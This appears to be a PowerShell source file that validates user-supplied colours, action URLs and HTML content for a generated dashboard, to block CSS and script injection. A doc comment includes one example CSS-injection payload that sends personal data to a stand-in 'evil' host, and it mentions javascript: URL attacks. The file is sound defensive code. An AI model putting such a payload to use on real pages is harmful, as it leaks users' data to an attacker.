function Test-DhSafeCssColor {
    <#
    .SYNOPSIS
        Validate a user-supplied CSS colour for safe use in inline style="…" markup.

    .DESCRIPTION
        Several public cmdlets accept a -Color (or per-item Color) string that the
        JS renderer interpolates into  style="background: <Color>"  via innerHTML.
        The HTML-escape used elsewhere (esc()) escapes < > & " but does NOT escape
        the CSS metacharacters  : ;  ( )  — so a malicious caller supplying e.g.

           red; background-image: url(http://evil/log?u=PII)

        would inject arbitrary CSS rules into the style attribute. This validator
        accepts only the four shapes that are useful for chart colours and rejects
        everything else with a deterministic, descriptive error.

        Accepted shapes:
          - #RGB / #RGBA / #RRGGBB / #RRGGBBAA   (3-, 4-, 6-, 8-digit hex)
          - rgb(...) / rgba(...) / hsl(...) / hsla(...)
                       — argument list restricted to digits, ., comma, %, space
          - var(--token)   — CSS custom-property reference (any --token name)
          - a single CSS named colour token (e.g. 'red', 'darkblue', 'transparent')

    .PARAMETER Color
        The colour string to validate. Empty / null are treated as "no colour
        supplied" and return $null (caller emits no inline-style attribute).

    .PARAMETER Context
        Free-form caller identifier used in the error message (e.g.
        "Add-DhPieChart slice 'Available'").
    #>
    param(
        [string] $Color,
        [string] $Context = 'colour value'
    )

    if ([string]::IsNullOrWhiteSpace($Color)) { return $null }

    $trimmed = $Color.Trim()

    $patterns = @(
        '^#[0-9a-fA-F]{3,4}$',                            # #RGB or #RGBA
        '^#[0-9a-fA-F]{6}$',                              # #RRGGBB
        '^#[0-9a-fA-F]{8}$',                              # #RRGGBBAA
        '^rgba?\(\s*[0-9.,\s%]+\s*\)$',                   # rgb()/rgba()
        '^hsla?\(\s*[0-9.,\s%]+\s*\)$',                   # hsl()/hsla()
        '^var\(\s*--[A-Za-z0-9_-]+\s*\)$',                # var(--token)
        '^[a-zA-Z]{3,32}$'                                # named colour
    )

    foreach ($p in $patterns) {
        if ($trimmed -match $p) { return $trimmed }
    }

    throw "$Context : '$Color' is not a recognised CSS colour. Pass a hex literal (#fff / #ffffff), rgb()/rgba(), hsl()/hsla(), var(--token), or a CSS named colour."
}


function Test-DhSafeActionUrl {
    <#
    .SYNOPSIS
        Validate a user-supplied URL before it flows into window.open() inside the
        generated dashboard.

    .DESCRIPTION
        Add-DhAlertBanner -Action @{Url=…} and Add-DhSummary tile Action.Url are
        both passed straight to  window.open(url, '_blank', 'noopener')  by the
        JS renderer. Without a scheme allowlist, a caller (or upstream tainted
        data piped into a caller) could supply  javascript:…  and execute script
        inside the dashboard's origin.

        Allowed schemes: http:, https:, mailto:, tel:, and a leading '#'
        (in-page anchor). Everything else throws.

    .PARAMETER Url
        The URL to validate. Null / empty returns the empty string (no Url
        supplied — the cmdlet caller handles the "Url-not-set" case).

    .PARAMETER Context
        Free-form caller identifier used in the error message.
    #>
    param(
        [string] $Url,
        [string] $Context = 'Action Url'
    )

    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }

    if ($Url -match '^(https?:|mailto:|tel:|#)') { return $Url }

    throw "$Context : '$Url' uses a scheme that is not allowed. Action Url must start with http:, https:, mailto:, tel:, or '#'."
}


function Test-DhLooksLikeHtml {
    <#
    .SYNOPSIS
        Heuristic — does this string appear to contain HTML markup?

    .DESCRIPTION
        Used only to decide whether to emit the -AllowHtml deprecation warning.
        Deliberately conservative: matches an opening tag (`<div`, `</p`, `<!--`)
        or a named/numeric HTML entity (`&amp;`, `&#39;`, `&#x2F;`). False
        positives here just produce an extra (harmless) warning; they never
        change rendering. Not a security control — the actual encoding decision
        is driven purely by the caller's -AllowHtml value.
    #>
    param([string] $s)
    if ([string]::IsNullOrEmpty($s)) { return $false }
    return ($s -match '<[a-zA-Z/!]') -or ($s -match '&(#[0-9]+|#x[0-9a-fA-F]+|[a-zA-Z][a-zA-Z0-9]*);')
}


function ConvertTo-DhSafeContent {
    <#
    .SYNOPSIS
        Apply the -AllowHtml policy to a raw-HTML content string.

    .DESCRIPTION
        Four cmdlets inject caller-supplied content into the DOM via innerHTML:
        Add-DhHtmlBlock (-Content), Add-DhTabs (per-tab Content), Add-DhCollapsible
        (-Content), and Add-DhAlertBanner (-Message). Each routes its content
        through this helper so the -AllowHtml behaviour and its warning are
        defined in exactly one place.

        Behaviour:
          -AllowHtml $false  -> the content is HTML-encoded (rendered as literal
                                text). Use for untrusted / external data.
          -AllowHtml $true   -> the content is returned verbatim (raw markup).

        v2.0.0 flipped the default from $true to $false. When the default applies
        (caller did not pass -AllowHtml) and the content looks like HTML, a
        warning names the call site, so a 1.x script being upgraded reports where
        its markup is now being encoded rather than changing appearance silently.

        Encoding uses [System.Net.WebUtility]::HtmlEncode — always available in
        .NET (PowerShell 7) with no assembly load, and it encodes < > & " ' .

    .PARAMETER Content
        The raw content string.

    .PARAMETER AllowHtml
        The resolved value of the cmdlet's -AllowHtml parameter.

    .PARAMETER Explicit
        $true when the caller passed -AllowHtml explicitly (i.e.
        $PSBoundParameters.ContainsKey('AllowHtml')). Suppresses the deprecation
        warning — an explicit choice is never nagged.

    .PARAMETER Context
        Caller identifier used in the warning message (e.g. "Add-DhHtmlBlock 'intro'").
    #>
    param(
        [string] $Content,
        [bool]   $AllowHtml,
        [bool]   $Explicit,
        [string] $Context = 'content'
    )

    if (-not $AllowHtml) {
        # v2.0.0 flipped the default to $false. Warn when content that LOOKS like
        # markup is being encoded without the caller having chosen, so an upgraded
        # 1.x script reports exactly where its HTML started rendering as text
        # instead of failing silently. An explicit choice is never nagged.
        if (-not $Explicit -and (Test-DhLooksLikeHtml $Content)) {
            Write-Warning ("$Context : content looks like HTML and is being HTML-ENCODED " +
                "(shown as literal text). This is the DashHtml 2.0.0 default; 1.x rendered " +
                "it as raw markup. Pass -AllowHtml:`$true if the markup is intentional and " +
                "trusted, or -AllowHtml:`$false to silence this warning.")
        }
        return [System.Net.WebUtility]::HtmlEncode($Content)
    }
    return $Content
}

